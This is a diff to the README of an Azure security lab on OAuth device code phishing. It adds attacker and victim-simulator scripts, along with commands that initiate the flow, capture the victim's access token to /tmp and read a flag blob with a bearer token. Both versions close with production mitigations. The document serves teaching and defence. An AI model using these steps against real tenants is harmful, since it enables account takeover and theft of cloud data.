@@ -4,86 +4,116 @@
 
 ## Scenario
 
-Microsoft's OAuth device code flow was designed for input-constrained devices (TVs, IoT). An
-attacker can abuse it by initiating the flow themselves, then socially engineering a victim into
-entering the device code at `microsoft.com/devicelogin`. The victim authenticates in their
-browser; the attacker's waiting CLI receives a full access + refresh token pair scoped to the
-victim's identity.
+Microsoft's OAuth **device code flow** was designed for input-constrained devices (smart TVs,
+IoT, headless servers). An attacker can abuse it by initiating the flow themselves, then
+socially engineering a victim into entering the one-time code at `microsoft.com/devicelogin`.
+Once the victim authenticates, the attacker's waiting process receives a full access + refresh
+token pair — no MFA required on the attacker's machine, and no password ever leaves the victim.
 
-In this lab a victim user holds `Storage Blob Data Reader` on a private storage account
-containing the flag. Shared key access is disabled — the only way to read the blobs is via
-an Entra ID token. Phish the device code, steal the token, read the flag.
+In this lab a victim user holds `Storage Blob Data Reader` on a private storage account.
+Shared key access is disabled — the only way to read the blobs is via an Entra ID token.
+Use the provided phishing tools to steal the victim's token, then read the flag.
+
+## Tools
+
+The lab ships two Python scripts in `tools/`:
+
+| Script | Role | Description |
+|---|---|---|
+| `phish.py` | Attacker | Initiates device code flow, displays phishing message, polls for token |
+| `victim_simulator.py` | Victim (automated) | Headless Playwright browser that enters the code and authenticates as the victim |
+
+### One-time setup
+
+```bash
+pip install playwright requests
+playwright install chromium
+```
 
 ## Attack Path
 
 ```
-[Attacker] az login --use-device-code
-    |
-    v
-Attacker copies device code URL + code --> "phishes" victim
-    |
-    v
-Victim authenticates in browser using the attacker's code
-    |
-    v
-Attacker CLI receives victim's access token
-    |
-    v
-az storage blob download --auth-mode login  -->  flag.txt
+Terminal 1 (attacker)                Terminal 2 (victim simulator)
+─────────────────────────────────    ──────────────────────────────────────────────
+python3 phish.py --tenant <domain>
+  → device code flow initiated
+  → phishing message displayed
+  → user_code: XXXXX-XXXXX
+  → polling Azure AD...              python3 victim_simulator.py \
+                                         --tenant <domain> \
+                                         --code   XXXXX-XXXXX \
+                                         --username victim@... \
+                                         --password '...'
+                                       → headless Chrome opens
+                                       → navigates to devicelogin
+                                       → enters code + victim credentials
+                                       → auth complete ✓
+  ← TOKEN CAPTURED
+  ← /tmp/dcp_token.json saved
 ```
 
-### Step 1 — Initiate the device code flow
+### Step 1 — Deploy the lab
 
 ```bash
-az login --use-device-code --allow-no-subscriptions
-# Output:
-#   To sign in, use a web browser to open https://microsoft.com/devicelogin
-#   and enter the code XXXXXXXXX to authenticate.
+cnimbus azure create --app-id device_code_phishing
 ```
 
-Copy the URL and the one-time code. In a real attack you would send these to the victim.
-In this lab, open the URL in a browser and log in as the victim user provided.
+Note the victim username, password, and storage account name from the output.
 
-### Step 2 — Discover accessible resources
+### Step 2 — Run the phishing tool (Terminal 1)
 
 ```bash
-# The CLI now holds the victim's token
-az account list --query "[].{name:name, id:id}" -o table
-
-# List storage accounts the victim can reach
-az storage account list --query "[].{name:name, rg:resourceGroup}" -o table
+cd app/cumulonimbus/applications/azure/device_code_phishing/tools
+python3 phish.py --tenant <tenant_domain>
 ```
 
-### Step 3 — Read the flag
+The tool prints a phishing message containing the verification URL and user code.
+Keep this terminal open — it polls Azure AD until the victim authenticates.
+
+### Step 3 — Simulate the victim (Terminal 2)
 
 ```bash
-az storage blob list \
-  --account-name <storage_account_name> \
-  --container-name sensitive-data \
-  --auth-mode login \
-  --query "[].name" -o tsv
+python3 victim_simulator.py \
+    --tenant   <tenant_domain> \
+    --code     <USER_CODE_from_Terminal_1> \
+    --username <victim_username> \
+    --password '<victim_password>'
+```
 
-az storage blob download \
-  --account-name <storage_account_name> \
-  --container-name sensitive-data \
-  --name flag.txt \
-  --file - \
-  --auth-mode login
+The simulator uses a headless Chromium browser to navigate to `microsoft.com/devicelogin`,
+enter the user code, and authenticate as the victim. Once complete, Terminal 1 receives
+the access token.
+
+### Step 4 — Read the flag
+
+```bash
+TOKEN=$(python3 -c "
+import json
+d = json.load(open('/tmp/dcp_token.json'))
+print(d['access_token'])
+")
+
+curl -s \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "x-ms-version: 2020-04-08" \
+  "https://<storage_account>.blob.core.windows.net/sensitive-data/flag.txt"
 ```
 
 ## How to Fix in Production
 
-1. **Restrict device code flow** — disable it for users who don't need it via Conditional
-   Access: *Grant* → *Require device code flow to be blocked* or restrict via authentication
-   method policies.
-2. **Enable Conditional Access** — require compliant/hybrid-joined devices, MFA, and
-   named location policies so stolen tokens cannot be used from arbitrary locations.
-3. **Monitor for device code sign-ins** — alert on `DeviceCodeSignIn` events in Entra ID
-   Sign-in logs, especially from unusual locations or for users who don't normally use
-   input-constrained devices.
-4. **Use Continuous Access Evaluation (CAE)** — short-lived tokens that are revoked the
-   moment a user's session is terminated, limiting the window an attacker can use a stolen token.
-5. **Phishing-resistant MFA** — FIDO2/passkeys cannot be replayed via device code phishing.
+1. **Block device code flow via Conditional Access** — in the Authentication flows policy,
+   set *Device code flow* to **Block** for all users who don't need it.
+2. **Phishing-resistant MFA (FIDO2 / passkeys)** — device code phishing succeeds because
+   standard MFA (SMS, Authenticator push) can be completed inside the phishing flow.
+   FIDO2 keys are origin-bound and cannot be replayed.
+3. **Continuous Access Evaluation (CAE)** — limits the lifetime of stolen tokens and revokes
+   them when the victim's session state changes.
+4. **Monitor device code sign-in events** — alert on `DeviceCodeSignIn` sign-in events in
+   Entra ID logs, especially from users who don't regularly authenticate from input-constrained
+   devices or from unfamiliar locations.
+5. **Token theft detection** — Defender for Identity and Microsoft Sentinel have rules
+   specifically for impossible-travel and unfamiliar-sign-in patterns that follow device code
+   phishing campaigns.
 
 ## MITRE ATT&CK Mapping
 
